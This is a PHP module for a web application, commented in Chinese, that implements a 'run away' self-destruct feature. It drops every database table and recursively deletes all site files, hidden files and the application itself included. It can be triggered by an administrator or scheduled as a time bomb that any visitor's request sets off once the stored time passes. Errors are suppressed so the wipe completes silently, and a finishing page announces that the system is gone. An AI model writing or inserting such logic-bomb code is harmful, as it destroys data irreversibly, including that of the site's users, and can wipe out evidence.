<?php
// 跑路功能：删库（DROP 全部数据表）+ 清空网站文件（删除站点根目录下全部内容）
// 极度危险操作：一键跑路需管理员输入「确认跑路」；定时跑路到达设定时间后于任意请求触发
declare(strict_types=1);

// 是否已设定定时跑路（返回时间戳，0 表示未设定）
function ruin_scheduled_at(): int
{
    try {
        $at = (int)cfg('ruin_at', '0');
    } catch (Throwable $ex) {
        return 0;
    }
    return $at > 0 ? $at : 0;
}

// 设定定时跑路（$timestamp 为 0 表示取消）
function ruin_schedule(int $timestamp): void
{
    set_cfg('ruin_at', (string)$timestamp, '定时跑路时间戳 0未设定 >0到达后任意请求触发删库清文件');
    if ($timestamp > 0) {
        audit('config', 'ruin_schedule', 1, (int)($_SESSION['admin_id'] ?? 0), '已设定定时跑路：' . date('Y-m-d H:i:s', $timestamp));
    } else {
        audit('config', 'ruin_cancel', 1, (int)($_SESSION['admin_id'] ?? 0), '已取消定时跑路');
    }
}

// 惰性触发：任意请求进入时检查定时跑路是否到点（在 bootstrap 中调用）
function ruin_tick(): void
{
    try {
        $at = ruin_scheduled_at();
        if ($at > 0 && $at <= time()) {
            ruin_execute();
        }
    } catch (Throwable $ex) {
        // 数据库不可用等情况静默跳过，不影响正常请求
    }
}

// 输出跑路完成独立页面（不依赖任何已删除的文件）
function ruin_output_page(): never
{
    http_response_code(200);
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">'
        . '<meta name="viewport" content="width=device-width,initial-scale=1">'
        . '<title>跑路完成</title><style>'
        . 'body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0b1220;font-family:system-ui,-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;color:#e8eefc}'
        . '.box{text-align:center;padding:48px 40px;border-radius:16px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);max-width:520px}'
        . 'h1{font-size:22px;margin:0 0 12px;color:#ff6b6b}p{font-size:14px;line-height:1.8;color:#9fb0d0;margin:6px 0}'
        . '</style></head><body><div class="box"><h1>&#128074; 跑路完成</h1>'
        . '<p>数据库已删除全部数据表，网站文件已清空。</p>'
        . '<p>本系统已不存在，无需再访问本地址。</p>'
        . '</div></body></html>';
    exit;
}

// 执行跑路：删库 → 清空网站文件 → 输出完成页
function ruin_execute(): never
{
    ignore_user_abort(true);
    @set_time_limit(0);

    // 1. 删库：逐个 DROP 当前连接数据库中的全部表
    try {
        if (is_file(ROOT_PATH . '/config.php')) {
            $pdo = db();
            try {
                $pdo->exec('SET FOREIGN_KEY_CHECKS=0');
            } catch (Throwable $ex) {
            }
            $tables = $pdo->query('SHOW TABLES')->fetchAll(PDO::FETCH_COLUMN);
            foreach ($tables as $t) {
                try {
                    $pdo->exec('DROP TABLE IF EXISTS `' . str_replace('`', '', (string)$t) . '`');
                } catch (Throwable $ex) {
                }
            }
        }
    } catch (Throwable $ex) {
        // 数据库连接失败时仍继续清空文件
    }

    // 2. 清空网站文件：删除站点根目录下全部内容（含系统自身）
    ruin_wipe_dir(ROOT_PATH);
    @rmdir(ROOT_PATH);

    // 3. 输出完成页
    ruin_output_page();
}

// 递归删除目录内容（先文件后目录，尽量删净、失败不中断）
function ruin_wipe_dir(string $dir): void
{
    if (!is_dir($dir)) {
        return;
    }
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($it as $f) {
            $p = $f->getPathname();
            try {
                if ($f->isLink()) {
                    @unlink($p);
                } elseif ($f->isDir()) {
                    @rmdir($p);
                } else {
                    @unlink($p);
                }
            } catch (Throwable $ex) {
            }
        }
    } catch (Throwable $ex) {
    }
    // 兜底再扫一遍隐藏文件
    foreach (glob($dir . '/.*') ?: [] as $f) {
        $b = basename($f);
        if ($b === '.' || $b === '..') {
            continue;
        }
        if (is_dir($f)) {
            ruin_wipe_dir($f);
            @rmdir($f);
        } else {
            @unlink($f);
        }
    }
}
